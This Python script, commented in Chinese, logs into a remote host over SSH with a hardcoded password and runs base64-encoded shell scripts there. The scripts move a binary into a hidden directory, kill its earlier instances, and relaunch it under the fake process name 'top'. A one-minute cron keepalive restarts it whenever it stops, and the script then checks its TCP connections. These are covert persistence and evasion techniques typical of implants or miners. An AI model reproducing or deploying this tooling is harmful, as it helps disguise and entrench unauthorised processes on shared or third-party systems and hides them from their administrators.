#!/usr/bin/env python3.13
import sys
sys.path.insert(0, '/home/z/.local/lib/python3.13/site-packages')
import paramiko, base64, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('public.nolanproject.my.id', port=22, username='public', password='123456', timeout=15, banner_timeout=30)

# 1. 迁移文件到 ~/.nz
print("=== 1. 迁移到 /pub/.nz ===")
MIGRATE = r'''set -e
NEW_HOME="$HOME/.nz"
mkdir -p "$NEW_HOME"

# 复制文件
cp /pub/.cache/.proc/top "$NEW_HOME/top" 2>/dev/null && chmod +x "$NEW_HOME/top"
cp /pub/.cache/.proc/.conf "$NEW_HOME/.conf" 2>/dev/null

# 杀旧进程
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
    exe=$(readlink /proc/$pid/exe 2>/dev/null)
    if [ "$exe" = "/pub/.cache/.proc/top" ] || [ "$exe" = "$NEW_HOME/top" ]; then
        kill -9 $pid 2>/dev/null
    fi
done
sleep 2

# 删除旧目录
rm -rf /pub/.cache/.proc

ls -la "$NEW_HOME"
'''
b64 = base64.b64encode(MIGRATE.encode()).decode()
stdin, stdout, stderr = ssh.exec_command(f"echo '{b64}' | base64 -d | bash", timeout=15)
print(stdout.read().decode())

# 2. 写启动脚本
print("\n=== 2. 写启动脚本 ===")
RUN = r'''#!/bin/bash
AGENT_DIR="/pub/.nz"
AGENT_BIN="$AGENT_DIR/top"
AGENT_CONF="$AGENT_DIR/.conf"
AGENT_LOG="$AGENT_DIR/.log"

for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
    exe=$(readlink /proc/$pid/exe 2>/dev/null)
    [ "$exe" = "$AGENT_BIN" ] && kill -9 $pid 2>/dev/null
done
sleep 1

nohup stdbuf -oL -eL bash -c 'exec -a top "/pub/.nz/top" -c "/pub/.nz/.conf"' > "$AGENT_LOG" 2>&1 < /dev/null &
echo $! > "$AGENT_DIR/.pid"
'''
b64 = base64.b64encode(RUN.encode()).decode()
stdin, stdout, stderr = ssh.exec_command(f"echo '{b64}' | base64 -d > /pub/.nz/.run && chmod +x /pub/.nz/.run", timeout=10)
print(stdout.read().decode())

# 3. 保活脚本
print("\n=== 3. 写保活脚本 ===")
KEEP = r'''#!/bin/bash
LOCK="/pub/.nz/.keep.lock"
AGENT_BIN="/pub/.nz/top"

exec 200>"$LOCK"
flock -n 200 || exit 0

RUNNING=0
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
    exe=$(readlink /proc/$pid/exe 2>/dev/null)
    [ "$exe" = "$AGENT_BIN" ] && RUNNING=1 && break
done

if [ "$RUNNING" -eq 0 ]; then
    bash /pub/.nz/.run
    echo "[$(date "+%F %T")] restarted" >> /pub/.nz/.keep.log
fi
'''
b64 = base64.b64encode(KEEP.encode()).decode()
stdin, stdout, stderr = ssh.exec_command(f"echo '{b64}' | base64 -d > /pub/.nz/.keep && chmod +x /pub/.nz/.keep", timeout=10)
print(stdout.read().decode())

# 4. 更新 cron
print("\n=== 4. 更新 cron ===")
stdin, stdout, stderr = ssh.exec_command("(crontab -l 2>/dev/null | grep -v '.cache/.proc' | grep -v '.nz/.keep'; echo '*/1 * * * * /pub/.nz/.keep >> /pub/.nz/.keep.cron.log 2>&1') | crontab -; crontab -l", timeout=10)
print(stdout.read().decode())

# 5. 启动
print("\n=== 5. 启动 ===")
stdin, stdout, stderr = ssh.exec_command("bash /pub/.nz/.run; sleep 5; ps -ef | grep -F '/pub/.nz/top' | grep -v grep | head -3", timeout=15)
print(stdout.read().decode())

# 6. 验证 TCP
print("\n=== 6. 等 15 秒看 TCP ===")
time.sleep(15)
stdin, stdout, stderr = ssh.exec_command("netstat -tnp 2>/dev/null | grep top | head -5; echo '---'; ls -la /pub/.nz/", timeout=10)
print(stdout.read().decode())

ssh.close()
print("\n=== 任务1 完成 ===")
